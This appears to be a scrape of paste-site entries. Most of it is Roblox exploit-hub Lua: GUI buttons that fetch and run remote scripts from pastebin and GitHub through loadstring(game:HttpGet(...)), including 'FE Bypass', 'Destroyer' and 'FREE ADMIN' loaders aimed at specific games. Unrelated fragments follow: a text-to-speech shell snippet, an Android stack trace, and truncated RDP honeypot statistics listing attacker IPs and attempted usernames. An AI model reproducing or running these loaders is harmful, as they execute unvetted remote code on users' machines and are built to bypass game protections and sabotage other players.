UIGradient_2.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_2.Parent = TextButton_2
TextButton_3.Parent = ScrollingFrame
TextButton_3.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_3.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.BorderSizePixel = 0
TextButton_3.Size = UDim2.new(0, 126, 0, 58)
TextButton_3.Font = Enum.Font.FredokaOne
TextButton_3.Text = ""TH""
TextButton_3.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_3.TextSize = 25.000
TextButton_3.TextWrapped = true
UICorner_4.CornerRadius = UDim.new(0, 15)
UICorner_4.Parent = TextButton_3
UIGradient_3.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_3.Parent = TextButton_3
TextButton_4.Parent = ScrollingFrame
TextButton_4.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_4.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.BorderSizePixel = 0
TextButton_4.Size = UDim2.new(0, 126, 0, 58)
TextButton_4.Font = Enum.Font.FredokaOne
TextButton_4.Text = ""VERTEX""
TextButton_4.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_4.TextSize = 25.000
TextButton_4.TextWrapped = true
UICorner_5.CornerRadius = UDim.new(0, 15)
UICorner_5.Parent = TextButton_4
UIGradient_4.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_4.Parent = TextButton_4
TextButton_5.Parent = ScrollingFrame
TextButton_5.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_5.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.BorderSizePixel = 0
TextButton_5.Size = UDim2.new(0, 126, 0, 58)
TextButton_5.Font = Enum.Font.FredokaOne
TextButton_5.Text = ""KCS""
TextButton_5.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_5.TextSize = 25.000
TextButton_5.TextWrapped = true
UICorner_6.CornerRadius = UDim.new(0, 15)
UICorner_6.Parent = TextButton_5
UIGradient_5.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_5.Parent = TextButton_5
TextButton_6.Parent = ScrollingFrame
TextButton_6.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_6.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.BorderSizePixel = 0
TextButton_6.Size = UDim2.new(0, 126, 0, 58)
TextButton_6.Font = Enum.Font.FredokaOne
TextButton_6.Text = ""SB ~ ZXN""
TextButton_6.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_6.TextSize = 25.000
TextButton_6.TextWrapped = true
UICorner_7.CornerRadius = UDim.new(0, 15)
UICorner_7.Parent = TextButton_6
UIGradient_6.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_6.Parent = TextButton_6
TextButton_7.Parent = ScrollingFrame
TextButton_7.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_7.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.BorderSizePixel = 0
TextButton_7.Size = UDim2.new(0, 126, 0, 58)
TextButton_7.Font = Enum.Font.FredokaOne
TextButton_7.Text = ""CLS""
TextButton_7.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_7.TextSize = 25.000
TextButton_7.TextWrapped = true
UICorner_8.CornerRadius = UDim.new(0, 15)
UICorner_8.Parent = TextButton_7
UIGradient_7.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_7.Parent = TextButton_7
TextButton_8.Parent = ScrollingFrame
TextButton_8.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_8.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.BorderSizePixel = 0
TextButton_8.Size = UDim2.new(0, 126, 0, 58)
TextButton_8.Font = Enum.Font.FredokaOne
TextButton_8.Text = ""BS""
TextButton_8.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_8.TextSize = 25.000
TextButton_8.TextWrapped = true
UICorner_9.CornerRadius = UDim.new(0, 15)
UICorner_9.Parent = TextButton_8
UIGradient_8.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_8.Parent = TextButton_8
TextButton_9.Parent = ScrollingFrame
TextButton_9.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_9.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.BorderSizePixel = 0
TextButton_9.Size = UDim2.new(0, 126, 0, 58)
TextButton_9.Font = Enum.Font.FredokaOne
TextButton_9.Text = ""C0RPKIDD""
TextButton_9.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_9.TextSize = 25.000
TextButton_9.TextWrapped = true
UICorner_10.CornerRadius = UDim.new(0, 15)
UICorner_10.Parent = TextButton_9
UIGradient_9.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_9.Parent = TextButton_9
TextButton_10.Parent = ScrollingFrame
TextButton_10.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_10.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.BorderSizePixel = 0
TextButton_10.Size = UDim2.new(0, 126, 0, 58)
TextButton_10.Font = Enum.Font.FredokaOne
TextButton_10.Text = ""PL UI""
TextButton_10.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_10.TextSize = 25.000
TextButton_10.TextWrapped = true
UICorner_11.CornerRadius = UDim.new(0, 15)
UICorner_11.Parent = TextButton_10
UIGradient_10.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_10.Parent = TextButton_10
TextButton_11.Parent = ScrollingFrame
TextButton_11.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_11.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.BorderSizePixel = 0
TextButton_11.Size = UDim2.new(0, 126, 0, 58)
TextButton_11.Font = Enum.Font.FredokaOne
TextButton_11.Text = ""GTH 2""
TextButton_11.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_11.TextSize = 25.000
TextButton_11.TextWrapped = true
UICorner_12.CornerRadius = UDim.new(0, 15)
UICorner_12.Parent = TextButton_11
UIGradient_11.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_11.Parent = TextButton_11
TextButton_12.Parent = ScrollingFrame
TextButton_12.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_12.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.BorderSizePixel = 0
TextButton_12.Size = UDim2.new(0, 126, 0, 58)
TextButton_12.Font = Enum.Font.FredokaOne
TextButton_12.Text = ""GTH""
TextButton_12.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_12.TextSize = 25.000
TextButton_12.TextWrapped = true
UICorner_13.CornerRadius = UDim.new(0, 15)
UICorner_13.Parent = TextButton_12
UIGradient_12.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_12.Parent = TextButton_12
TextButton_13.Parent = ScrollingFrame
TextButton_13.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_13.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.BorderSizePixel = 0
TextButton_13.Size = UDim2.new(0, 126, 0, 58)
TextButton_13.Font = Enum.Font.FredokaOne
TextButton_13.Text = ""KH""
TextButton_13.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_13.TextSize = 25.000
TextButton_13.TextWrapped = true
UICorner_14.CornerRadius = UDim.new(0, 15)
UICorner_14.Parent = TextButton_13
UIGradient_13.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_13.Parent = TextButton_13
TextButton_14.Parent = ScrollingFrame
TextButton_14.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_14.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.BorderSizePixel = 0
TextButton_14.Size = UDim2.new(0, 126, 0, 58)
TextButton_14.Font = Enum.Font.FredokaOne
TextButton_14.Text = ""GTH 3""
TextButton_14.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_14.TextSize = 25.000
TextButton_14.TextWrapped = true
UICorner_15.CornerRadius = UDim.new(0, 15)
UICorner_15.Parent = TextButton_14
UIGradient_14.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_14.Parent = TextButton_14
TextButton_15.Parent = ScrollingFrame
TextButton_15.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_15.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_15.BorderSizePixel = 0
TextButton_15.Size = UDim2.new(0, 126, 0, 58)
TextButton_15.Font = Enum.Font.FredokaOne
TextButton_15.Text = ""XXX hub""
TextButton_15.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_15.TextSize = 25.000
TextButton_15.TextWrapped = true
UICorner_16.CornerRadius = UDim.new(0, 15)
UICorner_16.Parent = TextButton_15
UIGradient_15.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_15.Parent = TextButton_15
TextButton_16.Parent = ScrollingFrame
TextButton_16.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
TextButton_16.BorderColor3 = Color3.fromRGB(0, 0, 0)
TextButton_16.BorderSizePixel = 0
TextButton_16.Size = UDim2.new(0, 126, 0, 58)
TextButton_16.Font = Enum.Font.FredokaOne
TextButton_16.Text = ""flood-r hub""
TextButton_16.TextColor3 = Color3.fromRGB(0, 0, 0)
TextButton_16.TextSize = 25.000
TextButton_16.TextWrapped = true
UICorner_17.CornerRadius = UDim.new(0, 15)
UICorner_17.Parent = TextButton_16
UIGradient_16.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_16.Parent = TextButton_16
UIGradient_17.Color = ColorSequence.new{ColorSequenceKeypoint.new(0.00, Color3.fromRGB(255, 255, 255)), ColorSequenceKeypoint.new(0.46, Color3.fromRGB(198, 198, 198)), ColorSequenceKeypoint.new(1.00, Color3.fromRGB(255, 255, 255))}
UIGradient_17.Rotation = 45
UIGradient_17.Parent = Frame
local function PZFMGE_fake_script() -- TextButton.LocalScript 
	local script = Instance.new('LocalScript', TextButton)

	local TweenService = game:GetService(""TweenService"")
	local button = script.Parent
	local fadeGroup = button.Parent.Parent
	local destroyTarget = fadeGroup
	local fadeTime = 1
	local function tweenUITransparency(uiObject)
		local props = {}
		if uiObject:IsA(""Frame"") or uiObject:IsA(""TextButton"") or uiObject:IsA(""TextLabel"") or uiObject:IsA(""ImageButton"") or uiObject:IsA(""ImageLabel"") then
			if uiObject:IsA(""TextLabel"") or uiObject:IsA(""TextButton"") then
				props.TextTransparency = 1
			end
			if uiObject:IsA(""ImageLabel"") or uiObject:IsA(""ImageButton"") then
				props.ImageTransparency = 1
			end
			props.BackgroundTransparency = 1
			local tween = TweenService:Create(uiObject, TweenInfo.new(fadeTime), props)
			tween:Play()
		end
	end
	local function fadeUIGroup(group)
		for _, descendant in pairs(group:GetDescendants()) do
			tweenUITransparency(descendant)
		end
	end
	button.MouseButton1Click:Connect(function()
		fadeUIGroup(fadeGroup)
		task.wait(fadeTime)
		destroyTarget:Destroy()
	end)
end
coroutine.wrap(PZFMGE_fake_script)()
local function DKGW_fake_script() -- TextButton_2.Script 
	local script = Instance.new('Script', TextButton_2)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
	end)
end
coroutine.wrap(DKGW_fake_script)()
local function VXKQQD_fake_script() -- TextButton_3.Script 
	local script = Instance.new('Script', TextButton_3)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet(""https://pastebin.com/raw/jpx7sKJe""))()
	end)
end
coroutine.wrap(VXKQQD_fake_script)()
local function WSPNUE_fake_script() -- TextButton_4.Script 
	local script = Instance.new('Script', TextButton_4)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://raw.githubusercontent.com/vertex-peak/vertex/refs/heads/main/loadstring'))()
	end)
end
coroutine.wrap(WSPNUE_fake_script)()
local function YGQGX_fake_script() -- TextButton_5.Script 
	local script = Instance.new('Script', TextButton_5)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/XfssS3aD'))()
	end)
end
coroutine.wrap(YGQGX_fake_script)()
local function KLUPI_fake_script() -- TextButton_6.Script 
	local script = Instance.new('Script', TextButton_6)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/egXiCLBf'))()
	end)
end
coroutine.wrap(KLUPI_fake_script)()
local function SBJPWJ_fake_script() -- TextButton_7.Script 
	local script = Instance.new('Script', TextButton_7)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/hmEGLEDw'))()
	end)
end
coroutine.wrap(SBJPWJ_fake_script)()
local function UNUQ_fake_script() -- TextButton_8.Script 
	local script = Instance.new('Script', TextButton_8)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/Fja2nhyP'))()
	end)
end
coroutine.wrap(UNUQ_fake_script)()
local function MLVGR_fake_script() -- TextButton_9.Script 
	local script = Instance.new('Script', TextButton_9)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/GmaBxan9'))()
	end)
end
coroutine.wrap(MLVGR_fake_script)()
local function DCTFLPJ_fake_script() -- TextButton_10.Script 
	local script = Instance.new('Script', TextButton_10)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/H9KTAsFm'))()
	end)
end
coroutine.wrap(DCTFLPJ_fake_script)()
local function NIRIQRO_fake_script() -- TextButton_11.Script 
	local script = Instance.new('Script', TextButton_11)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/YZtqvSi2'))()
	end)
end
coroutine.wrap(NIRIQRO_fake_script)()
local function ZLGQS_fake_script() -- TextButton_12.Script 
	local script = Instance.new('Script', TextButton_12)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/mcLD9Tbe'))()
	end)
end
coroutine.wrap(ZLGQS_fake_script)()
local function FAUEZB_fake_script() -- TextButton_13.Script 
	local script = Instance.new('Script', TextButton_13)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/p3gFzFGF'))()
	end)
end
coroutine.wrap(FAUEZB_fake_script)()
local function UWHGU_fake_script() -- TextButton_14.Script 
	local script = Instance.new('Script', TextButton_14)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/rPp3y1uq'))()
	end)
end
coroutine.wrap(UWHGU_fake_script)()
local function SRXVDG_fake_script() -- TextButton_15.Script 
	local script = Instance.new('Script', TextButton_15)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/rPp3y1uq'))()
	end)
end
coroutine.wrap(SRXVDG_fake_script)()
local function UNJV_fake_script() -- TextButton_16.Script 
	local script = Instance.new('Script', TextButton_16)

	script.Parent.MouseButton1Click:Connect(function()
		loadstring(game:HttpGet('https://pastebin.com/raw/rPp3y1uq'))()
	end)
end
coroutine.wrap(UNJV_fake_script)()
local function YNXISM_fake_script() -- Frame.UIDrag 
	local script = Instance.new('LocalScript', Frame)

	-- Made by Real_IceyDev (@lceyDex) --
	-- Simple UI dragger (PC Only/Any device that has a mouse) --
	
	local UIS = game:GetService('UserInputService')
	local frame = script.Parent
	local dragToggle = nil
	local dragSpeed = 0.25
	local dragStart = nil
	local startPos = nil
	
	local function updateInput(input)
		local delta = input.Position - dragStart
		local position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X,
			startPos.Y.Scale, startPos.Y.Offset + delta.Y)
		game:GetService('TweenService'):Create(frame, TweenInfo.new(dragSpeed), {Position = position}):Play()
	end
	
	frame.InputBegan:Connect(function(input)
		if (input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch) then 
			dragToggle = true
			dragStart = input.Position
			startPos = frame.Position
			input.Changed:Connect(function()
				if input.UserInputState == Enum.UserInputState.End then
					dragToggle = false
				end
			end)
		end
	end)
	
	UIS.InputChanged:Connect(function(input)
		if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
			if dragToggle then
				updateInput(input)
			end
		end
	end)
end
coroutine.wrap(YNXISM_fake_script)()"
5ipB7UBb,c00lgui,GREGORIAH_lol,Lua,Thursday 29th of May 2025 12:44:06 AM CDT,"local c00lgui = Window:Creat
eTab(""c00lgui"", nil) -- Title, Image
local c00lguiSection = c00lgui:CreateSection(""c00lgui"")
local Button = c00lgui:CreateButton({
   Name = ""c00lgui v2.2 by team c00lkidd"",
   Callback = function()loadstring(game:HttpGet(""https://raw.githubusercontent.com/theawesomari0/c00lgui/66033e8ff67eccc421fb04b3924e42d4adf3d7a2/c00lgui%20v2.2?subid1=20230826-2047-4399-8bd3-612370889e32"",true))()
   end,
})
local Button = c00lgui:CreateButton({
   Name = ""Destroyer GUI"",
   Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/MiRw3b/c00lgui-v3rx/main/c00lguiv3rx.lua"",true))()
   end,
})
local Button = c00lgui:CreateButton({
   Name = ""c00lgui reborn v0.5"",
   Callback = function()
        loadstring(game:GetObjects(""rbxassetid://8127297852"")[1].Source)()
   end,
})
local feTab = Window:CreateTab(""Fe Bypass"", nil) -- Title, Image
local feSection = feTab:CreateSection(""Fe Bypass"")
local Paragraph = feTab:CreateParagraph({Title = ""NOTICE"", Content = ""Some FE script can doesn't work if they don't work contact me FireServiceScripter#1073 on discord""})
local Button = feTab:CreateButton({
   Name = ""FE GAMEPASS UI"",
   Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/QtQ4YnVR'))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Twilight Daycare Destroyer"",
   Callback = function()
        loadstring(game:HttpGet('https://gist.githubusercontent.com/dark-modz/46b122bee4a227eca1355a56ebff0cd3/raw/1a1eb29f7eb7153a718986afb379d2786c420fab/OPtwilightdaycareGUI'))(' Watermelon ? ')
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Build And Survive Destroyer"",
   Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/LgfZbBVy'))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Bypassing Hub GUI"",
   Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/RealMrQuacks/AuratusX/master/Load""))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Tools Drop [FREE ADMIN]"",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/brownfieldd00/Roblox/main/Games/FREE%20ADMIN.lua'))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Troll GUI"",
   Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/GetYoScript/Aayus/main/Sick""))()
   end,
})
local Button = feTab:CreateButton({
   Name = ""FE Btools"",
   Callback = function()
        loadstring(game:HttpGet('https://pastebin.com/raw/WaqDDa8v'))()
    end,
})
local Button = feTab:CreateButton({
   Name = ""FE Hub Script [Best]"",
   Callback = function()
        loadstring(game:HttpGet('https://raw.githubusercontent.com/Dvrknvss/UniversalFEScriptHub/main/Script'))()
   end,
})
local Executors = Window:CreateTab(""Executors"", nil) -- Title, Image
local ExSection = Executors:CreateSection(""RC7"")
local Button = Executors:CreateButton({
   Name = ""RC7"",
   Callback = function()
        loadstring(game:HttpGet(""https://raw.githubusercontent.com/CoreGui/Scripts/main/RC7""))()
   end,
})"
Wk65ZzKb,Better Text to Speech with piper,metalx1000,Bash,Wednesday 28th of May 2025 07:53:18 PM CDT,"# Better text to speech with piper
# https://github.com/rhasspy/piper

# get piper
wget ""https://github.com/rhasspy/piper/releases/download/v1.2.0/piper_amd64.tar.gz""
tar xzvf piper_amd64.tar.gz
cd piper

# get voice models
# https://github.com/rhasspy/piper/blob/master/VOICES.md
wget ""https://huggingface.co/rhasspy/piper-voices/resolve/v1.0.0/en/en_GB/alan/medium/en_GB-alan-medium.onnx""
wget ""https://huggingface.co/rhasspy/piper-voices/resolve/v1.0.0/en/en_GB/alan/medium/en_GB-alan-medium.onnx.json""

# Play the audio from text
echo 'This sentence is spoken first. This sentence is synthesized while the first sentence is spoken.' | ./piper --model en_GB-alan-medium.onnx --output-raw | aplay -r 22250 -f S16_LE -t raw -

"
iCNQa9Cu,2025-05-28T19:19:32.575586,powerampache,PHP,Wednesday 28th of May 2025 07:19:33 PM CDT,"1.01-80-play (80) - DB: 83
luci.sixsixsix.powerampache2.domain.errors.MusicException: {""errorAction"":""genre_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 116"",""errorType"":""filter""}
	at luci.sixsixsix.powerampache2.data.SongsRepositoryImpl$getSongsByGenre$2.invokeSuspend(SongsRepositoryImpl.kt:397)
	at kotlin.coroutines.jvm.internal.BaseContinuationImpl.resumeWith(ContinuationImpl.kt:33)
	at kotlinx.coroutines.DispatchedTask.run(DispatchedTask.kt:104)
	at android.os.Handler.handleCallback(Handler.java:959)
	at android.os.Handler.dispatchMessage(Handler.java:100)
	at android.os.Looper.loopOnce(Looper.java:257)
	at android.os.Looper.loop(Looper.java:342)
	at android.app.ActivityThread.main(ActivityThread.java:9579)
	at java.lang.reflect.Method.invoke(Native Method)
	at com.android.internal.os.RuntimeInit$MethodAndArgsCaller.run(RuntimeInit.java:619)
	at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:929)

getArtists() - {""errorAction"":""genre_songs"",""errorCode"":""4704"",""errorMessage"":""Not Found: 116"",""errorType"":""filter""}"
nMQ8CNXU,2025-05-28_stats.json,rdp_snitch,JSON,Wednesday 28th of May 2025 07:18:10 PM CDT,"{
  ""ip"": {
    ""24.173.30.170"": 6801,
    ""128.199.168.88"": 5724,
    ""143.198.221.164"": 537,
    ""157.245.159.1"": 339,
    ""123.103.219.78"": 51,
    ""80.94.95.198"": 54,
    ""88.214.25.121"": 6,
    ""91.238.181.94"": 6,
    ""194.187.177.117"": 3,
    ""71.82.170.60"": 18,
    ""92.63.197.197"": 12,
    ""66.228.46.123"": 12,
    ""205.210.31.48"": 9,
    ""45.56.112.145"": 3,
    ""157.245.150.219"": 3,
    ""92.63.197.23"": 33,
    ""167.172.153.78"": 6,
    ""138.68.188.52"": 3,
    ""194.0.234.34"": 6,
    ""205.210.31.67"": 9,
    ""107.173.58.226"": 6,
    ""78.142.18.92"": 3,
    ""134.122.51.9"": 36,
    ""82.147.88.139"": 6,
    ""103.15.222.151"": 6,
    ""185.196.220.41"": 9,
    ""111.170.152.113"": 9,
    ""195.178.110.98"": 6,
    ""147.185.132.58"": 9,
    ""165.154.182.72"": 3,
    ""165.232.170.129"": 4395,
    ""91.238.181.96"": 6,
    ""198.235.24.184"": 9,
    ""88.214.25.123"": 6
  },
  ""asn"": {
    ""AS11427"": 6801,
    ""AS14061"": 11043,
    ""AS4826"": 51,
    ""AS204428"": 54,
    ""AS35042"": 12,
    ""AS49434"": 12,
    ""AS208843"": 3,
    ""AS20115"": 18,
    ""AS210848"": 45,
    ""AS63949"": 15,
    ""AS396982"": 36,
    ""AS214295"": 6,
    ""AS20278"": 6,
    ""AS208046"": 12,
    ""AS211860"": 6,
    ""AS149137"": 6,
    ""AS151185"": 9,
    ""AS48090"": 6,
    ""AS135377"": 3
  },
  ""isp"": {
    ""Charter Communications Inc"": 6801,
    ""DigitalOcean, LLC"": 11043,
    ""Vocus PTY LTD"": 51,
    ""SS-Net"": 54,
    ""NOC EMAIL: noc@one-host.net"": 12,
    ""Datacenter location PAR1 France"": 12,
    ""Alpha Strike Labs GmbH"": 3,
    ""Charter Communications"": 18,
    ""Telkom Internet LTD"": 45,
    ""Akamai Technologies, Inc."": 15,
    ""Google LLC"": 36,
    ""Skynet Network LTD"": 6,
    ""Nexeon Technologies, Inc."": 6,
    ""ColocationX Ltd."": 12,
    ""Nerushenko Vyacheslav Nikolaevich"": 6,
    ""TAN Thanh AN International Trade Development Company Limited"": 6,
    ""China Telecom"": 9,
    ""Techoff SRV Limited"": 6,
    ""UCLOUD INFORMATION TECHNOLOGY (HK) LIMITED"": 3
  },
  ""org"": {
    ""Spectrum"": 6819,
    ""DigitalOcean, LLC"": 11043,
    ""Vocus Communications"": 51,
    ""Unmanaged LTD"": 54,
    ""ThinkTech Technology Industrial CO. Limited"": 24,
    ""Alpha Strike Labs GmbH"": 3,
    ""Korotkij Denis Aleksandrovich"": 45,
    ""Linode"": 15,
    ""Palo Alto Networks, Inc"": 36,
    ""Skynet Network LTD"": 6,
    ""ColoCrossing"": 6,
    ""ColocationX Ltd"": 12,
    ""Nerushenko Vyacheslav Nikolaevich"": 6,
    ""TANTHANHAN"": 6,
    ""Chinanet HB"": 9,
    ""Techoff SRV Limited"": 6,
    ""Ucloud Information Technology (hk) Limited"": 3
  },
  ""regionName"": {
    ""Texas"": 6801,
    ""South West"": 10998,
    ""Western Australia"": 51,
    ""Sofia-Capital"": 54,
    ""Kowloon City"": 12,
    ""\u00cele-de-France"": 12,
    ""State of Berlin"": 3,
    ""Wisconsin"": 18,
    ""North Holland"": 84,
    ""New Jersey"": 18,
    ""California"": 39,
    ""Georgia"": 3,
    ""England"": 9,
    ""New York"": 6,
    ""Krasnoyarsk Krai"": 6,
    ""Hanoi"": 6,
    ""Virginia"": 9,
    ""Hubei"": 9,
    ""Andorra la Vella"": 6
  },
  ""country"": {
    ""United States"": 6894,
    ""Singapore"": 10998,
    ""Australia"": 51,
    ""Bulgaria"": 54,
    ""Hong Kong"": 12,
    ""France"": 12,
    ""Germany"": 3,
    ""The Netherlands"": 84,
    ""United Kingdom"": 9,
    ""Russia"": 6,
    ""Vietnam"": 6,
    ""China"": 9,
    ""Andorra"": 6
  },
  ""account"": {
    ""hello"": 17856,
    ""142.93.8.59"": 126,
    ""Test"": 36,
    ""user"": 3,
    ""152s6omg"": 12,
    ""yczeDBqhx"": 3,
    ""DuvwKL"": 3,
    ""bexGkd"": 3,
    ""beio"": 3,
    ""Administr"": 60,
    ""REkuHSOwW"": 3,
    ""acHews"": 3,
    ""XJWMXu"": 3,
    ""Domain"": 9,
    ""FBcrZVMET"": 3,
    ""FqXtkU"": 3,
    ""pBFZzb"": 3,
    ""Administrator"": 3,
    ""WbqnkaBFR"": 3,
    ""DCXOSk"": 3,
    ""bNTXIm"": 3
  },
  ""keyboard"": {
    ""Unknown"": 18144
  },
  ""client_build"": {
    ""Unknown"": 18144
  },
  ""client_name"": {
    ""Unknown"": 18144
  },
  ""ip_type"": {
    ""Unknown"": 7029,
    ""hosting"": 11109,
